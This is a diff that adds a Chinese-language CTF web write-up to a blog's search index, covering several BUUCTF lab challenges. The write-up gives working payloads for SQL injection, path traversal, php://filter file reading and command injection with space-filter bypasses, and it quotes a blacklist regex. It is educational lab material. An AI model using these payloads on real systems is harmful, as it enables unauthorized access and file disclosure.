@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>WEB刷题</title>
+      <link href="/CTF-WriteUP/ownPra_web/"/>
+      <url>/CTF-WriteUP/ownPra_web/</url>
+      
+        <content type="html"><![CDATA[<h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><h4 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h4><p>进入靶机，根据题目要求，进行sql注入</p><p>用户名使用admin’ 来探测过滤器</p><p>发现可以使用，直接进行简单的sql注入</p><p>使用万能密码admin’ or 1&#x3D;1#作为用户名，密码随意</p><p>得到flag</p><h4 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h4><p>摁f12查看源码，发现cat参数判断</p><p>尝试传get参数cat&#x3D;dog</p><p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250331184349118.png" alt="image-20250331184349118"></p><p>得到flag</p><h4 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h4><p>查看源代码，发现一个提示</p><p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250331184525077.png" alt="image-20250331184525077"></p><p>访问这个php，得到一段代码</p><p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250331184613726.png" alt="image-20250331184613726"></p><p>我们来逐步分析一下source.php的代码：</p><pre><code class="highlight php"> <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])    ) &#123;        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];        <span class="keyword">exit</span>;    &#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;&#125;</code></pre><p>这段代码的意思是source.php接收一个file参数，当file这个参数满足以下三个条件时返回file指定的文件，否则输出一张图片。</p><ul><li>file参数不为空</li><li>file参数是一个string类型</li><li>file参数能够通过checkFile的检验</li></ul><p>查看hint.php后发现</p><p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250331184927686.png" alt="image-20250331184927686"></p><p>于是一层一层从文件系统向上找</p><p>最后得到payload：**?file&#x3D;source.php?.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg**</p><p>flag{c3bc189d-3f92-43e8-9463-b3de15916f1c}</p><h4 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h4><p>首先查看源码</p><p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250331191156593.png" alt="image-20250331191156593"></p><p>这个会跳转到flag.php</p><p>然后只有一个Can you find out the flag?</p><p><del>然后我就蒙了</del>查了一下，发现了php伪协议这个东西</p><p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250331191534990.png" alt="image-20250331191534990"></p><p>猜测flag.php文件显示不全</p><p>payload: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>如果不进行过滤操作，数据会被当做php代码执行</p><p><img src="https://qingchenyou-1301914189.cos.ap-beijing.myqcloud.com/image-20250331191800719.png" alt="image-20250331191800719"></p><p>解码后得到flag：flag{6cef29f0-789b-484a-ba17-8bc632de4c4a}</p><h4 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h4><p>根据题目提示，直接尝试了php一句话木马</p><p>好吧不行</p><p>又尝试了分句linux命令执行，诶成功了</p><p>127.0.0.1;cat ..&#x2F;..&#x2F;..&#x2F;flag</p><p>flag{6700dd7b-1fb8-4941-9094-3a4418a5a1a3}</p><h4 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h4><p>又是ping？再试试执行linux语句呢？</p><p>找到了flag.php,但是好像做了拦截？</p><p>绕过空格的思路一般有：</p><pre><code class="highlight plaintext">$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行&lt;&lt;&gt;&#123;cat,flag.php&#125; //用逗号实现了空格功能%20%09</code></pre><p>尝试一下</p><pre><code class="highlight plaintext">cat$IFS$1index.php</code></pre><p>可以看到index.php的代码</p><pre><code class="highlight plaintext">/?ip=|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);    die(&quot;fxck your symbol!&quot;);  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;    die(&quot;fxck your space!&quot;);  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;    die(&quot;fxck your bash!&quot;);  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;    die(&quot;fxck your flag!&quot;);  &#125;  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);  echo &quot;&quot;;  print_r($a);&#125;?&gt;</code></pre><p>于是可以得到payload</p><pre><code class="highlight plaintext">/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre><p>在源码中可以看到flag{7c4b49b7-e5e2-4baa-aef6-f493f1504ad4}</p><h4 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h4><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF_WriteUP </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Digital China WriteUP</title>
       <link href="/CTF-WriteUP/digit_china_wp/"/>
       <url>/CTF-WriteUP/digit_china_wp/</url>
